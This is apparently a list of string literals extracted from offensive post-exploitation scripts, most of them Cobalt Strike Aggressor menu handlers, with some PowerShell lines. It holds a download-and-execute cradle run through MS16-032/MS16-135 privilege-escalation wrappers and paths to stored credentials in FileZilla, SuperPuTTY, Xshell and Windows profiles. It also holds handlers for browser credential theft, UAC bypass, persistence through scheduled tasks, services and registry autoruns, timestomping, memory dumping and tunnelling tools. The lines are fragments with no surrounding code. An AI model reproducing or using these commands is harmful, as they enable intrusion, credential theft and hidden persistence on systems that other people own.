"C:\Documents and Settings\""+$User.Name+""\NTUSER.DAT"""
"C:\PS> Invoke-MS16-032 -Command ""iex(New-Object Net.WebClient).DownloadString('http://google.com')"""
"C:\PS> Invoke-MS16135 -Command ""iex(New-Object Net.WebClient).DownloadString('http://google.com')"""
"C:\Users\"" + (Split-Path -Leaf $UserObject.""Source"") + ""\AppData\Roaming\FileZilla\sitemanager.xml"""
"C:\Users\"" + (Split-Path -Leaf $UserObject.""Source"") + ""\Documents\SuperPuTTY\Sessions.xml"""
"C:\Users\$MappedUserName\AppData\Roaming\FileZilla\sitemanager.xml"""
"C:\Users\$MappedUserName\Documents\SuperPuTTY\Sessions.xml"""
"C:\Windows\System32\cmd.exe"", """","
"C:\Windows\Temp\"""
"C:\\"",file => ""payload.exe||passwords*||*.txt"",bid => $bid), &SharpDir);"
"C:\\123.xlsx"",bid => $bid), &SharpExcelibur_check);"
"C:\\123.xlsx"",bid => $bid), &SharpExcelibur_sheet_check);"
"C:\\123.xlsx"",passwd => """",bid => $bid), &SharpExcelibur_sheet_check_pass);"
"C:\\123.xlsx"",sheetname => """",bid => $bid), &SharpExcelibur_sheet_read);"
"C:\\123.xlsx"",sheetname => """",passwd => """",bid => $bid), &SharpExcelibur_sheet_read);"
"C:\\Progra~1\\Intern~1\\iexplore.exe -k $1"");"
"C:\\Users\\$3['user']\\AppData\\Roaming\\SogouExplorer"");"
"C:\\Users\\administrator\\Documents\\NetSarang Computer\\7\\Xshell\\Sessions\"""",bid => $bid), &SharpXDecrypt);"
"C:\\Windows\\System32\\cmd.exe"",args => ""\""whoami\"""",bid => $bid), &SharpExec_cmd);"
"C:\\Windows\\System32\\cmd.exe\"" -a \""/c $3['payload']\"" -n \""$3['schtask_name']\"" -m add -o $3['schtask_time']""));"
"C:\\Windows\\System32\\cmd.exe\"" -a \""/c $3['payload']\"" -n \""$3['schtask_name']\"" -m add""));"
"C:\\Windows\\System32\\cmd.exe\"" -a \""/c $3['payload']\"" -n \""$3['service_name']\"" -m add""));"
"C:\\Windows\\Temp"",outpath => ""C:\\windows"",,bid => $bid), &net_copy);"
"C:\\Windows\\Temp\\"", bid => $bid), &360bowser_upload);"
"C:\\Windows\\Temp\\"", bid => $bid), &ATPMiniDump);"
"C:\\Windows\\Temp\\"", bid => $bid), &FRP);"
"C:\\Windows\\Temp\\"", bid => $bid), &PrintSpoofer_upload);"
"C:\\Windows\\Temp\\"", bid => $bid), &WMIHACKER);"
"C:\\Windows\\Temp\\"", bid => $bid), &beacon_path);"
"C:\\Windows\\Temp\\"", bid => $bid), &brute_wordlist);"
"C:\\Windows\\Temp\\"", bid => $bid), &chfs_upload);"
"C:\\Windows\\Temp\\"", bid => $bid), &crack);"
"C:\\Windows\\Temp\\"", bid => $bid), &fscan);"
"C:\\Windows\\Temp\\"", bid => $bid), &hack_browser_upload);	"
"C:\\Windows\\Temp\\"", bid => $bid), &iox);"
"C:\\Windows\\Temp\\"", bid => $bid), &npc_upload);"
"C:\\Windows\\Temp\\"", bid => $bid), &scrying_upload);	"
"C:\\Windows\\Temp\\"",bid => $bid), &net_install);"
"C:\\Windows\\Temp\\"",url => ""https://download.microsoft.com/download/E/2/1/E21644B5-2DF2-47C2-91BD-63C560427900/NDP452-KB2901907-x86-x64-AllOS-ENU.exe"",,bid => $bid), &net_download);"
"C:\\Windows\\Temp\\1.txt"",modifytime => ""2019-02-19 01:01:01.111"",bid => $bid), &file_time);	"
"C:\\Windows\\Temp\\123.exe"",bid => $bid), &RegAuto_ladon);"
"C:\\Windows\\Temp\\123.exe"",bid => $bid), &bypassuac_ladon);"
"C:\\Windows\\Temp\\123.exe"",url => """",,bid => $bid), &net_download);"
"C:\\Windows\\Temp\\123.exe\"""",arguments => ""arg1 arg2"",bid => $bid), &SharpHide_RegAuto_arg);"
"C:\\Windows\\Temp\\123.exe\"""",bid => $bid), &SharpHide_RegAuto);"
